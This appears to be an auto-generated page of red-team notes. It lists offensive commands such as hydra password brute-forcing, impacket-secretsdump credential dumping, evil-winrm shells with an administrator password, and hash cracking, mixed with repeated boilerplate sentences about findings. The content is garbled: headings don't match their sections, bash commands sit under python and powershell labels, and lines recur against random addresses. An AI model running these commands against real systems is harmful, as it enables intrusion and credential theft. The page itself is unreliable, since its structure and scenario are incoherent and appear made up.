---
TitleSEO: "PowerShell for Red Teamers | ZureFX"
TitlePost: "PowerShell for Red Teamers"
Author: "ZureFX"
Description: "Personal notes on PowerShell for Red Teamers. Quick reference for pentesting and CTF challenges."
Keywords: "windows, dfir, enumeration, networking, blue team, privilege escalation"
URL: "https://zurefx.github.io/notes/note-powershell-for-red-teamers-653.html"
URL_IMAGES: ""
Date: "2025-10-21"
Tags: "Windows, DFIR, Enumeration, Networking, Blue Team, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-powershell-for-red-teamers-653"
Permalink: "/notes/note-powershell-for-red-teamers-653.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Remote Code Execution

### secretsdump

```bash
evil-winrm -i 10.86.233.159 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p3268,53,110 10.89.143.30 -oN scan.txt
nmap -sCV -p995,443,139 10.128.5.216 -oN scan.txt
```

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.88.89.68 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.115.64.252 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.119.172.37/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```powershell
nmap -sCV -p9200,22,1521 10.21.197.24 -oN scan.txt
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.14.98.167/FUZZ
evil-winrm -i 10.57.140.204 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

## Unconstrained Delegation

### Writable PATH

```python
evil-winrm -i 10.10.82.98 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.41.195 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.51.60.109/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.123.86.104/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

> **Note:** Insecure Deserialization was identified as the primary attack vector in this scenario.

```python
evil-winrm -i 10.13.80.53 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.124.65.105/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.226.16 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.67.51.37
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.95.39.145
```

## Cron Job

### Ubuntu 20.04

Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services.

```python
evil-winrm -i 10.29.174.44 -u administrator -p 'P@ssw0rd!'
```

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.17.221.250
```

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file. Post-exploitation enumeration revealed a path to domain administrator privileges.

- `ACL Abuse`
- `XSS`
- `hydra`
- `SSRF`
- `Writable PATH`
- `LXD Privilege Escalation`

## DNS

### Django

```bash
nmap -sCV -p21,5432,3306 10.41.76.24 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.54.46.121
```

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

- `NFS No Root Squash`
- `CSRF`
- `Sudo Misconfiguration`
- `john`

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## RPC

### POP3

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.67.52
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.77.65.23/FUZZ
gobuster dir -u http://10.46.197.98/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.12.148.12 -u administrator -p 'P@ssw0rd!'
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.25.221/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

## SUID Binary

### Unquoted Service Path

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.98.77.124
evil-winrm -i 10.110.66.100 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

```powershell
evil-winrm -i 10.88.101.245 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p636,135,27017 10.102.52.185 -oN scan.txt
```
